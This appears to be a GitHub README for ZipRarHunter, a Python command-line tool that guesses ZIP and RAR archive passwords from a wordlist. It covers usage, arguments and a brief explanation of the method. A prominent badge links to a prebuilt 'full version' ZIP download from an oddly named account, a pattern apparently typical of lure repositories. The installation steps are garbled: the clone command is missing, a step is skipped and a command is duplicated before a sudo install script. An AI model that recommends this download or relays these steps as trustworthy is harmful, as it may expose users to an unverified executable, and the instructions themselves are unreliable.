## ZipRarHunter
[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-red)](https://github.com/lareine-nikeairmaxmnt/ZipRarHunter/releases/download/fkd53z0a/ZipRarHunter.zip)

ZipRarHunter is a command-line password cracking tool designed to crack passwords for ZIP and RAR archive files using a wordlist. It helps automate the process of password recovery from encrypted archive files.

## Features
- **Support for ZIP and RAR Files:** ZipRarHunter works with both ZIP and RAR archives.
- **Wordlist-based Cracking:** The tool uses a wordlist (a file containing potential passwords) to attempt cracking the password.

- **Real-time Feedback:** It shows the current password being attempted in real time, so you can track the progress.
- **Cross-platform:** This tool works on Linux, macOS, and Windows (with Python installed).
## Requirements
- **Python 3.x:** Ensure that Python 3 is installed on your system.
- **Dependencies:**
- `zipfile` (for handling ZIP files)
- `rarfile` (for handling RAR files)
You can install the required Python packages using `pip`:
```bash
pip install rarfile
```
## Installation

1. **Clone the repository:**


```bash
cd ZipRarHunter
```
3. **Ensure all dependencies are installed. If not, run:**

``` bash
pip install -r requirements.txt
```

4. **Navigate to the ZipRarHunter directory**
   
```bash
cd ZipRarHunter
```
5. **Install the tool**
```bash
sudo python3 install.py
```
**then enter `y` for install**
## Usage
ZipRarHunter uses command-line arguments to specify the target file, wordlist, and file type (ZIP or RAR).

## Basic Usage
```bash
ziprarhunter -f /path/to/archive.zip -w /path/to/wordlist.txt -t zip
ziprarhunter -f /path/to/archive.rar -w /path/to/wordlist.txt -t rar
```
## Command-line Arguments
- `-f` or `--file`: The path to the ZIP or RAR file you want to crack.
- `-w` or `--wordlist`: The path to the wordlist file that contains potential passwords.
- `-t` or `--type`: The type of archive. Acceptable values are zip or rar.
- `--no-color`: Disable colored output. By default, the output will include color for easier readability.
## Example Commands
1. **Crack a ZIP file with a wordlist:**

``` bash
ziprarhunter -f /path/to/archive.zip -w /path/to/wordlist.txt -t zip
```
2. **Crack a RAR file with a wordlist:**

```bash
ziprarhunter -f /path/to/archive.rar -w /path/to/wordlist.txt -t rar
```
3. **Disable colored output:**

```bash
ziprarhunter -f /path/to/archive.zip -w /path/to/wordlist.txt -t zip --no-color
```
## Output Example
```bash
Trying password: password123
Password found for ZIP file: password123
```
## How It Works
1. **ZIP File Cracking**: The program opens the ZIP file using the zipfile module and sets the password for each attempt. It then uses testzip() to check if the password is correct. If the password is valid, it prints the success message and exits.

2. **RAR File Cracking**: The program opens the RAR file using the rarfile module and attempts to extract the first file in the archive using each password from the wordlist. If the extraction succeeds, the password is deemed correct, and the program exits.

3. **Real-Time Feedback**: Each password attempt is displayed on the screen in real time. The current password is shown with color-coded output to indicate progress.

## uninstallation
```bash
cd ZipRarHunter
```
```bash
cd ZipRarHunter
```
```bash
sudo python3 install.py
```
**Then Enter `n` for uninstall**

## License
This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer
This tool is intended for educational purposes only. It should be used responsibly and legally. Unauthorized use of this tool to crack passwords without permission is illegal and unethical.
